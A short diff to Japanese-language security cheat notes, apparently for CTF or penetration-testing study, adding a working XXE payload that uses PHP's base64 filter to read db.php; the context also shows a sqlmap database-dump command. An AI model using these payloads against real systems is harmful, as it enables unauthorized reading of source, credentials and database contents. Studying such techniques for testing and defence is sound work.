@@ -1007,6 +1007,20 @@ sqlmap -u 'http://localhost:5000/users' --data 'name=Alice' --dump
 
 [XXE とは？徳丸先生の解説](https://blog.tokumaru.org/2017/)
 
+PHPでXXE攻撃する場合、以下のようにPHPフィルタを用いてBASE64エンコードするという技が知られている。
+
+```
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>1</cwe>
+		<cvss>1</cvss>
+		</bugreport>
+
+```
+
 ## LFI
 
 ```
